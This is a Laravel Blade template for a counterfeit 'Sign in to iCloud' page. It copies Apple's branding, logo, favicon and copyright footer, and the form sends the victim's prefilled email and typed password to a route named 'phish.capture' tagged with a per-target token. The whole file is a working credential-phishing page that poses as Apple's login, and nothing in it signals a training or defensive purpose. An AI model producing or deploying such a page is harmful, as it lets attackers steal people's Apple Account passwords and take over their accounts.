<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#323236">
    <title>Sign in to iCloud</title>
    <link rel="icon" href="https://www.icloud.com/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:system-ui,-apple-system,'Helvetica Neue','Segoe UI',sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;color:rgba(0,0,0,.88)}
        .topbar{height:44px;background:rgba(251,251,253,.5);backdrop-filter:saturate(180%) blur(20px);display:flex;align-items:center;padding:0 20px;position:sticky;top:0;z-index:100}
        .topbar-left{display:flex;align-items:center;gap:6px}
        .topbar-left svg{width:16px;height:16px;fill:rgba(0,0,0,.88)}
        .main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 20px}
        .hero-title{font-size:clamp(48px,10vw,140px);font-weight:600;letter-spacing:-2.8px;line-height:1;margin-bottom:8px;text-align:center;color:rgba(0,0,0,.88)}
        .hero-subtitle{font-size:17px;font-weight:400;line-height:1.2;text-align:center;color:rgba(0,0,0,.88);margin-bottom:40px;max-width:520px}
        .signin-box{width:100%;max-width:360px}
        .signin-box h2{font-size:28px;font-weight:600;text-align:center;margin-bottom:20px}
        .input-group{margin-bottom:16px}
        .input-group label{display:block;font-size:13px;color:#86868b;margin-bottom:4px;font-weight:400}
        .input-group input{width:100%;height:36px;padding:0 12px;font-size:17px;font-family:system-ui,sans-serif;color:#1d1d1f;background:#f5f5f7;border:1px solid #d2d2d7;border-radius:8px;outline:none;transition:border-color .15s}
        .input-group input:focus{border-color:#0071e3}
        .btn-signin{width:100%;height:40px;background:#0071e3;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;transition:background .15s;margin-top:8px}
        .btn-signin:hover{background:#0077ed}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#0071e3;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{padding:16px 24px;text-align:center;font-size:12px;color:#86868b;border-top:1px solid #f0f0f0}
        .footer a{color:#86868b;text-decoration:none;margin:0 6px}
        .footer a:hover{text-decoration:underline;color:#1d1d1f}
        @media(max-width:480px){.main{padding:24px 16px}.hero-title{font-size:48px;letter-spacing:-1px}}
    </style>
</head>
<body>
    <div class="topbar">
        <div class="topbar-left">
            <svg viewBox="0 0 17 20"><path d="M15.5 14.7c-.4 1.1-.9 2.1-1.4 3.1-.7 1.3-1.2 2.2-1.7 2.7-.7.8-1.5 1.2-2.3 1.3-.6 0-1.3-.2-2.1-.5-.8-.3-1.5-.5-2.2-.5-.7 0-1.5.2-2.2.5-.8.3-1.4.5-1.9.5-.9.1-1.7-.4-2.4-1.2C.3 19.3-.1 18-.4 16.5c-.4-1.6-.5-3.1-.2-4.7.3-1.3.8-2.4 1.6-3.3.7-.7 1.5-1.1 2.4-1.2.7 0 1.6.2 2.5.6.9.4 1.5.6 1.7.6.2 0 .8-.2 2-.7.9-.4 1.7-.6 2.3-.5 1.7.1 2.9.8 3.7 2.1-1.5.9-2.2 2.1-2.1 3.7 0 1.2.5 2.3 1.3 3.1zM12.2.5c0 1-.4 1.9-1.1 2.7-.9 1-1.9 1.5-3 1.4 0-.1 0-.2 0-.3 0-1 .4-2 1.1-2.8.4-.5.8-.9 1.4-1.2.6-.3 1.2-.5 1.7-.5 0 .1 0 .3 0 .5z" fill="rgba(0,0,0,.88)"/></svg>
        </div>
    </div>

    <div class="main">
        <div class="hero-title">iCloud</div>
        <p class="hero-subtitle">The best place for all your photos, files, notes, mail, and more.</p>

        <div class="signin-box">
            <h2>Sign in to iCloud</h2>
            <p style="text-align:center;font-size:17px;color:rgba(0,0,0,.88);margin-bottom:24px">Use your Apple Account</p>

            <form action="{{ route('phish.capture', ['provider' => 'icloud', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="input-group">
                    <label for="email">Email or Phone Number</label>
                    <input type="text" id="email" name="email" value="{{ $email }}" readonly>
                </div>

                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" autofocus>
                </div>

                <button type="submit" class="btn-signin">Sign In</button>
            </form>

            <div class="links-row">
                <a href="#">Forgot password?</a>
                <a href="#">Create Apple Account</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy Policy</a>
        <a href="#">Terms of Use</a>
        <a href="#">Copyright © 2026 Apple Inc.</a>
    </div>
</body>
</html>
